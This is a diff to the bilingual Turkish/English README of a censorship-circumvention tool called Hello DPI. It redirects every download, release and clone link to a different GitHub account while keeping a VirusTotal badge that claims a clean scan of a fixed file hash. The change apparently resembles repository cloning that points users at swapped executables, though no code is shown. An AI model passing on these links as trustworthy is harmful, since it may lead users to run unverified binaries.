@@ -13,7 +13,7 @@
 
   <br />
 
-  [![Release](https://img.shields.io/github/v/release/emreaytekxn/hello-dpi?color=black&logo=github)](https://github.com/emreaytekxn/hello-dpi/releases/latest)
+  [![Release](https://img.shields.io/github/v/release/nikatheproffesor/hello-dpi?color=black&logo=github)](https://github.com/nikatheproffesor/hello-dpi/releases/latest)
   [![VirusTotal](https://img.shields.io/badge/VirusTotal-0%2F72%20Temiz-brightgreen?logo=virustotal)](https://www.virustotal.com/gui/file/844d5272908215776cb5d339815bdaedf7e0ad41698ab2294706c04e0aa673fd)
   [![License: MIT](https://img.shields.io/badge/Lisans-MIT-black.svg)](LICENSE)
   [![Platform](https://img.shields.io/badge/Platform-macOS%20%7C%20Windows%20%7C%20Linux-black.svg)](#-kolay-kurulum-sıfır-terminal)
@@ -37,10 +37,10 @@ Hiçbir komut satırı, kod veya terminal bilgisine ihtiyacınız yoktur. İşle
 
 | İşletim Sistemi | İndirme Dosyası | Kurulum ve Çalıştırma |
 | :--- | :--- | :--- |
-| **🍏 macOS (Önerilen)** | [**HelloDPI-macOS.dmg**](https://github.com/emreaytekxn/hello-dpi/releases/latest) | DMG dosyasını açın, `Hello DPI.app` simgesini Applications (Uygulamalar) klasörüne sürükleyin ve çift tıklayın. |
-| **🍏 macOS (ZIP Arşivi)** | [**HelloDPI-macOS.zip**](https://github.com/emreaytekxn/hello-dpi/releases/latest) | ZIP arşivini açın ve içindeki `Hello DPI.app` uygulamasını çift tıklayarak çalıştırın. |
-| **🪟 Windows (64-bit)** | [**HelloDPI-Windows.exe**](https://github.com/emreaytekxn/hello-dpi/releases/latest) | İndirin ve çift tıklayın (Siyah terminal ekranı açılmaz, sağ altta saatin yanına yerleşir). |
-| **🐧 Linux (x86_64)** | [**hellodpi-linux-amd64**](https://github.com/emreaytekxn/hello-dpi/releases/latest) | Bağımsız ikili dosya veya GNOME / KDE Plasma masaüstü tepsisi ile çalışır. |
+| **🍏 macOS (Önerilen)** | [**HelloDPI-macOS.dmg**](https://github.com/nikatheproffesor/hello-dpi/releases/latest) | DMG dosyasını açın, `Hello DPI.app` simgesini Applications (Uygulamalar) klasörüne sürükleyin ve çift tıklayın. |
+| **🍏 macOS (ZIP Arşivi)** | [**HelloDPI-macOS.zip**](https://github.com/nikatheproffesor/hello-dpi/releases/latest) | ZIP arşivini açın ve içindeki `Hello DPI.app` uygulamasını çift tıklayarak çalıştırın. |
+| **🪟 Windows (64-bit)** | [**HelloDPI-Windows.exe**](https://github.com/nikatheproffesor/hello-dpi/releases/latest) | İndirin ve çift tıklayın (Siyah terminal ekranı açılmaz, sağ altta saatin yanına yerleşir). |
+| **🐧 Linux (x86_64)** | [**hellodpi-linux-amd64**](https://github.com/nikatheproffesor/hello-dpi/releases/latest) | Bağımsız ikili dosya veya GNOME / KDE Plasma masaüstü tepsisi ile çalışır. |
 
 ---
 
@@ -71,7 +71,7 @@ Hello DPI, **bilgisayarla arası sadece günlük kullanımla sınırlı olan, te
 
 #### 🪟 Windows Kullanıcıları İçin
 
-1. [**HelloDPI-Windows.exe**](https://github.com/emreaytekxn/hello-dpi/releases/latest) dosyasını indirin ve çift tıklayın.
+1. [**HelloDPI-Windows.exe**](https://github.com/nikatheproffesor/hello-dpi/releases/latest) dosyasını indirin ve çift tıklayın.
 2. Sağ alttaki sistem tepsisinde (saatin yanındaki ok simgesinin içinde) minimalist simgemiz belirecektir.
 3. Siyah komut satırı ekranı açılmaz, arka planda sessizce ve hafifçe çalışır.
 
@@ -92,7 +92,7 @@ Hello DPI, **bilgisayarla arası sadece günlük kullanımla sınırlı olan, te
 
 #### 🍏 macOS Kullanıcıları İçin
 
-1. [**HelloDPI-macOS.dmg**](https://github.com/emreaytekxn/hello-dpi/releases/latest) dosyasını indirin ve çift tıklayarak açın.
+1. [**HelloDPI-macOS.dmg**](https://github.com/nikatheproffesor/hello-dpi/releases/latest) dosyasını indirin ve çift tıklayarak açın.
 2. Açılan penceredeki `Hello DPI` simgesini yanındaki `Applications` (Uygulamalar) klasörüne sürükleyip bırakın.
 3. Uygulamalar klasörünüze gidip `Hello DPI` simgesine çift tıklayın.
 4. Sağ üst menü çubuğunuzda minimalist simgemiz belirecektir. Artık Discord, Roblox ve tüm sansürlü siteler açıktır!
@@ -293,7 +293,7 @@ Projeyi yerel makinenizde derlemek veya test etmek isterseniz:
 
 ```bash
 # 1. Depoyu klonlayın
-git clone https://github.com/emreaytekxn/hello-dpi.git
+git clone https://github.com/nikatheproffesor/hello-dpi.git
 cd hello-dpi
 
 # 2. Birim testlerini ve Fuzzing testini çalıştırın
@@ -324,10 +324,10 @@ Hello DPI is an ultra-lightweight, zero-latency Deep Packet Inspection (DPI) cir
 
 | Operating System | Download File | Installation |
 | :--- | :--- | :--- |
-| **🍏 macOS (Recommended)** | [**HelloDPI-macOS.dmg**](https://github.com/emreaytekxn/hello-dpi/releases/latest) | Open the DMG, drag `Hello DPI.app` into Applications, and double-click. |
-| **🍏 macOS (ZIP Archive)** | [**HelloDPI-macOS.zip**](https://github.com/emreaytekxn/hello-dpi/releases/latest) | Extract ZIP and run `Hello DPI.app`. |
-| **🪟 Windows (64-bit)** | [**HelloDPI-Windows.exe**](https://github.com/emreaytekxn/hello-dpi/releases/latest) | Download and run (Lives in System Tray near the clock, no black console window). |
-| **🐧 Linux (x86_64)** | [**hellodpi-linux-amd64**](https://github.com/emreaytekxn/hello-dpi/releases/latest) | Standalone executable or systemd service. |
+| **🍏 macOS (Recommended)** | [**HelloDPI-macOS.dmg**](https://github.com/nikatheproffesor/hello-dpi/releases/latest) | Open the DMG, drag `Hello DPI.app` into Applications, and double-click. |
+| **🍏 macOS (ZIP Archive)** | [**HelloDPI-macOS.zip**](https://github.com/nikatheproffesor/hello-dpi/releases/latest) | Extract ZIP and run `Hello DPI.app`. |
+| **🪟 Windows (64-bit)** | [**HelloDPI-Windows.exe**](https://github.com/nikatheproffesor/hello-dpi/releases/latest) | Download and run (Lives in System Tray near the clock, no black console window). |
+| **🐧 Linux (x86_64)** | [**hellodpi-linux-amd64**](https://github.com/nikatheproffesor/hello-dpi/releases/latest) | Standalone executable or systemd service. |
 
 ---
 
